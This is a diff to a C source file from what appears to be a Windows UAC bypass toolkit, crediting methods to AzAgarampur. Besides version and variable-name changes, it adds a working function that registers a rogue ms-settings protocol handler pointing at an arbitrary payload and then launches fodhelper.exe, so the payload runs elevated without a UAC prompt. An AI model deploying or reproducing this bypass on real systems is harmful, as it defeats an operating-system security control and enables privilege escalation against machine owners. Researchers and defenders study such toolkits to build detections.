@@ -4,9 +4,9 @@
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.53
+*  VERSION:     3.54
 *
-*  DATE:        09 Nov 2020
+*  DATE:        26 Dec 2020
 *
 *  UAC bypass methods from AzAgarampur.
 * 
@@ -16,6 +16,7 @@
 *  https://github.com/AzAgarampur/byeintegrity2-uac
 *  https://github.com/AzAgarampur/byeintegrity3-uac
 *  https://github.com/AzAgarampur/byeintegrity4-uac
+*  https://github.com/AzAgarampur/byeintegrity-lite
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -659,7 +660,7 @@ NTSTATUS ucmFwCplLuaMethod2(
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     HRESULT r = E_FAIL, hr_init;
     ULONG DataSize = 0, SnapinSize = 0;
-    SIZE_T l, PayloadDirNameLen = 0, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0, ProtocolNameLen;
+    SIZE_T nLen, PayloadDirNameLen = 0, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0, ProtocolNameLen;
     PVOID SnapinResource = NULL, SnapinData = NULL, MscBufferPtr = NULL;
     PVOID ImageBaseAddress = g_hInstance;
     LPOLESTR protoGuidString = NULL;
@@ -689,10 +690,9 @@ NTSTATUS ucmFwCplLuaMethod2(
             break;
 
         //
-        // Converted GUID to ANSI to be used in msc modification next.
+        // Convert protocol name to ANSI to be used in msc modification next.
         //
         ProtocolNameLen = _strlen(MYSTERIOUSCUTETHING);
-
         RtlSecureZeroMemory(szProtocol, sizeof(szProtocol));
         WideCharToMultiByte(CP_ACP, 0,
             MYSTERIOUSCUTETHING,
@@ -738,9 +738,9 @@ NTSTATUS ucmFwCplLuaMethod2(
         //
         _strcpy(szBuffer, g_ctx->szTempDirectory);
 
-        l = _strlen(szBuffer);
-        if (szBuffer[l - 1] == L'\\') {
-            szBuffer[l - 1] = 0;
+        nLen = _strlen(szBuffer);
+        if (szBuffer[nLen - 1] == L'\\') {
+            szBuffer[nLen - 1] = 0;
         }
 
         fEnvSet = supSetEnvVariable(FALSE, NULL, T_WINDIR, szBuffer);
@@ -766,7 +766,7 @@ NTSTATUS ucmFwCplLuaMethod2(
         if (!NT_SUCCESS(MethodResult))
             break;
 
-        MscBufferSize = ALIGN_UP_BY(1 + (SIZE_T)SnapinSize + (SIZE_T)sizeof(szProtocol), PAGE_SIZE);
+        MscBufferSize = ALIGN_UP_BY(1 + (SIZE_T)SnapinSize + (SIZE_T)sizeof(szProtocol), (SIZE_T)PAGE_SIZE);
         MscBufferPtr = supVirtualAlloc(
             &MscBufferSize,
             DEFAULT_ALLOCATION_TYPE,
@@ -886,6 +886,85 @@ NTSTATUS ucmFwCplLuaMethod2(
         szPayloadDir[PayloadDirNameLen] = 0;
         RemoveDirectory(szPayloadDir);
     }
+
+    return MethodResult;
+}
+
+/*
+* ucmMsSettignsProtocolMethod
+*
+* Purpose:
+*
+* Bypass UAC by registering own ms-settings protocol.
+*
+*/
+NTSTATUS ucmMsSettignsProtocolMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HRESULT hr_init;
+
+    LPOLESTR protoGuidString = NULL;
+    USER_ASSOC_PTR SetUserAssoc;
+    GUID guid;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));
+
+    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    do {
+
+        if (CoCreateGuid(&guid) != S_OK)
+            break;
+
+        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
+            break;
+
+        //
+        // Find UserAssocSet
+        //
+        MethodResult = supFindUserAssocSet(&SetUserAssoc);
+        if (!NT_SUCCESS(MethodResult))
+            break;
+
+        //
+        // Register shell protocol.
+        //
+        MethodResult = supRegisterShellAssoc(T_MSSETTINGS,
+            protoGuidString,
+            &SetUserAssoc,
+            lpszPayload,
+            TRUE);
+
+        if (NT_SUCCESS(MethodResult)) {
+
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
+            _strcat(szBuffer, FODHELPER_EXE);
+
+            MethodResult = supRunProcess(szBuffer, NULL) ?
+                STATUS_SUCCESS : STATUS_ACCESS_DENIED;
+
+        }
+
+    } while (FALSE);
+
+    //
+    // Cleanup.
+    //
+    if (protoGuidString) {
+
+        supUnregisterShellAssoc(T_MSSETTINGS,
+            protoGuidString,
+            &SetUserAssoc);
+
+        CoTaskMemFree(protoGuidString);
+    }
+
+    if (SUCCEEDED(hr_init))
+        CoUninitialize();
 
     return MethodResult;
 }
